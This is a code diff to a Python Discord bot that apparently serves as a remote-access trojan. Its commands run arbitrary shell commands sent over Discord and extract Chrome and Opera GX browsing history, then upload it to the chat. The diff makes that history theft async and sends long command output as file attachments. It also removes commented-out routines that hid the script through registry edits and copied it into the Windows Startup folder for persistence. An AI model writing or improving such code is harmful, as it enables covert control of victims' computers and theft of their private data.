@@ -452,9 +452,19 @@ async def cmd(ctx, *, command: str = None):
                     if 'thread' not in locals():
                         current_datetime = datetime.datetime.now().strftime("-%S")
                         unique_thread_name = command[:100-len(current_datetime)]+current_datetime
-                        thread = await ctx.send(f"**Output:**\n{first_output}")
-                        thread = await thread.create_thread(name=unique_thread_name)
-                    await thread.send(output)
+                        if len(f"Output:\n{first_output}") > 2000:
+                            buffer_io = io.BytesIO(f"**Output:**\n{first_output}".encode("utf-8"))
+                            msg = await ctx.send(file=discord.File(fp=buffer_io, filename="command_output.txt"))
+                            thread = await msg.create_thread(name=unique_thread_name)
+                        else:
+                            thread = await ctx.send(f"**Output:**\n{first_output}")
+                            thread = await thread.create_thread(name=unique_thread_name)
+                                
+                    if len(output) > 2000:
+                        output_io = io.BytesIO(output.encode("utf-8"))
+                        await thread.send(file=discord.File(fp=output_io, filename="line_output.txt"))
+                    else:
+                        await thread.send(output)
 
         if first_output and 'thread' not in locals():
             await ctx.send(f"**Output:**\n{first_output}")
@@ -874,7 +884,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
     files = []
     missing_browsers = []
 
-    def extract_chrome_history():
+    async def extract_chrome_history():
         base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
         if not os.path.exists(base):
             return None, "Chrome"
@@ -884,7 +894,7 @@ async def gethistory(ctx, max_force_profiles: int = 10):
         min_date = datetime.datetime.utcnow() - datetime.timedelta(days=30)
         min_timestamp = int((min_date - epoch_start).total_seconds() * 1_000_000)
 
-        def extract(profile):
+        async def extract(profile):
             try:
                 profile_path = os.path.join(base, profile, "History")
                 if not os.path.exists(profile_path):
@@ -906,23 +916,24 @@ async def gethistory(ctx, max_force_profiles: int = 10):
                     output.write("\n")
                 conn.close()
             except Exception as e:
-                ctx.send("Error extracting Chrome history: " + str(e))
-            os.remove(temp_db)
+                await ctx.send("Error extracting Chrome history: " + str(e))
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
             return True
 
-        found = extract("Default")
+        found = await extract("Default")
 
         for i in range(1, max_force_profiles + 1):
-            found |= extract(f"Profile {i}")
+            found |= await extract(f"Profile {i}")
 
         i = max_force_profiles + 1
         while True:
-            if not extract(f"Profile {i}"):
+            if not await extract(f"Profile {i}"):
                 break
             i += 1
         return output.getvalue().encode("utf-8") if found else None, None
 
-    def extract_opera_history():
+    async def extract_opera_history():
         try:
             base = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable")
             history_path = os.path.join(base, "History")
@@ -951,12 +962,13 @@ async def gethistory(ctx, max_force_profiles: int = 10):
                 output.write("\n")
             conn.close()
         except Exception as e:
-            ctx.send("Error extracting Opera GX history: " + str(e))
-        os.remove(temp_db)
+            await ctx.send("Error extracting Opera GX history: " + str(e))
+        if os.path.exists(temp_db):
+            os.remove(temp_db)
         return output.getvalue().encode("utf-8"), None
 
-    chrome_data, chrome_err = extract_chrome_history()
-    opera_data, opera_err = extract_opera_history()
+    chrome_data, chrome_err = await extract_chrome_history()
+    opera_data, opera_err = await extract_opera_history()
 
     if chrome_data:
         chrome_buffer = io.BytesIO(chrome_data)
@@ -1533,53 +1545,6 @@ async def commands(ctx, page: int = 1):
 
         except asyncio.TimeoutError:
             break
-
-# Disabled to prevent use, as it prevents the app from starting
-
-# @bot.command(help="Hides the script file and disables show hidden files (windows doesn't allow autostarting hidden files so be carefull).")
-# async def hidescript(ctx):
-#     try:
-#         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", 0, winreg.KEY_SET_VALUE)
-#         winreg.SetValueEx(reg_key, "Hidden", 0, winreg.REG_DWORD, 2)
-#         winreg.SetValueEx(reg_key, "ShowSuperHidden", 0, winreg.REG_DWORD, 0)
-#         winreg.CloseKey(reg_key)
-#         script_path = sys.executable
-#         os.system(f'attrib +h "{script_path}"')
-#     except Exception as e:
-#         await ctx.send(f"Error executing command: {str(e)}")
-      
-# Depreciated in favor of the installer script      
-  
-# @bot.command(help="Makes this script execute on logon (only user that ran this file, startup programs dont start if hidden, hence the now seperate command).")
-# async def startup(ctx):
-#     try:
-#         script_path = sys.argv[0]
-#         
-#         startup_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-#     
-#         if not os.path.exists(startup_folder):
-#             os.makedirs(startup_folder)
-#         
-#         script_name = os.path.basename(script_path)
-#         destination_path = os.path.join(startup_folder, script_name)
-#     
-#         shutil.copy(script_path, destination_path)
-#     
-#         print(f"Script '{script_name}' moved to the startup folder.")
-#         await ctx.send(f"Moved '{script_name}' to the startup folder.")
-#         
-#         if script_path.endswith('.py') or script_path.endswith('.pyw'):
-#             startup_command = f'cmd /C start /MIN pythonw "{destination_path}" & del "{script_path}"'
-#         else:
-#             startup_command = f'start /MIN "" "{destination_path}" & del "{script_path}"'
-#         
-#         subprocess.Popen(startup_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-#         
-#         await ctx.send("Script started on startup successfully.")
-#         sys.exit()
-# 
-#     except Exception as e:
-#         await ctx.send(f"Error executing command: {str(e)}")
         
 @bot.command(help="Force stops the bot.")
 async def estop(ctx):
